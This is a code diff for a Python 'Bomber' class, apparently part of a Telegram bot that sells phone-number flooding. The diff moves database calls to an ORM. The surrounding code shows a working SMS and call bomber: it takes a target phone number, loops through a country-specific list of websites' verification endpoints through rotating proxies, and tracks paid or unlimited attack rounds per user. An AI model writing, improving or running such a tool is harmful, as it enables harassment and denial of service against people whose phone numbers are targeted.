@@ -7,8 +7,8 @@ import datetime
 import traceback
 from loguru import logger
 from aiohttp import ClientSession
-from db_models.User import data_users_table
 from sqlalchemy import select
+from db_models.User import session, User, DataUser
 
 class Bomber:
     user_id:str
@@ -44,31 +44,28 @@ class Bomber:
                         "190.13.138.50:4153", 
                         "77.37.208.119:55491"
                        ] #Список прокси
-        self.circle:int = 0
-        self.state_seconds:int = 0
-        self.process_status:bool = True
+
+        self.state_circles:int = 0 #State seconds
+        self.process_status:bool = True #Is process
 
     async def start(self, phone, chat_id):
-
-        my_circles = select([data_users_table.c.status]).where(data_users_table.c.user_id==chat_id)
-        my_circles = globals.conn.execute(my_circles).fetchone()[0]
-
-        if my_circles == "∞":self.state_seconds = "∞"
-        else:self.state_seconds = int(my_circles)
+        my_circles = session.query(DataUser.status).filter_by(user_id=chat_id).first()[0]
+        
+        if my_circles == "∞":self.state_circles = "∞"
+        else:self.state_circles = int(my_circles)
 
         with open(r"sites/sites_%s.json" % globals.attack_country, "r", encoding="UTF-8") as all_sites:
             sites = json.loads(all_sites.read())
         
         while self.process_status:
-            if self.state_seconds == "∞":pass
+            if self.state_circles == "∞":pass
             else:
-                self.state_seconds-=1
-                if self.state_seconds == 0:
-                    
-                    update_data = data_users_table.update().values(
-                        status=self.state_seconds
-                    ).where(data_users_table.c.user_id==chat_id)
-                    globals.conn.execute(update_data)
+                self.state_circles-=1
+                if self.state_circles == 0:
+
+                    update_data = session.query(DataUser).filter_by(user_id=chat_id).first()
+                    update_data.status = self.state_circles
+                    session.commit()
                     
                     await globals.bot.send_message(
                             chat_id,
@@ -76,19 +73,17 @@ class Bomber:
                     return await self.session.close()
                     break
 
-            if self.circle == 15:
+                elif self.state_circles == 15:
+                    update_data = session.query(DataUser).filter_by(user_id=chat_id).first()
+                    update_data.status = self.state_circles
+                    session.commit()
 
-                update_data = data_users_table.update().values(
-                        status=self.state_seconds
-                    ).where(data_users_table.c.user_id==chat_id)
-                globals.conn.execute(update_data)
-
-                await globals.bot.send_message(
-                        chat_id,
-                        text=f"⌛️Превышено время атаки... Не забывайте отключать атаку!\n"
-                        f"⚙️Влияет на нагрузку памяти и процессора!")
-                await self.session.close()
-                break
+                    await globals.bot.send_message(
+                            chat_id,
+                            text=f"⌛️Превышено время атаки... Не забывайте отключать атаку!\n"
+                            f"⚙️Влияет на нагрузку памяти и процессора!")
+                    await self.session.close()
+                    break
 
             for v in sites.values():
                 if "json" in list(v.keys()) and not v["format"]:
@@ -125,8 +120,7 @@ class Bomber:
                             headers=self.user_agent
                         ) as resp:pass
                         await asyncio.sleep(1)
-                    except:pass
-                    
+                    except:pass                  
 
                 else:
                     url = v["url"].format(phone)
@@ -142,16 +136,14 @@ class Bomber:
             await asyncio.sleep(5)
 
     async def stop(self, chat_id):
-        if self.state_seconds == "∞":pass
+        if self.state_circles == "∞":pass
         else:
-            update_data = data_users_table.update().values(
-                status=self.state_seconds
-            ).where(data_users_table.c.user_id==chat_id)
-            globals.conn.execute(update_data)
+            update_data = session.query(DataUser).filter_by(user_id=chat_id).first()
+            update_data.status = self.state_circles
+            session.commit()
         
         self.process_status = False
-        await self.session.close()
-        
+        await self.session.close()       
 
 def mask(str, maska):
     if len(str) == maska.count("#"):
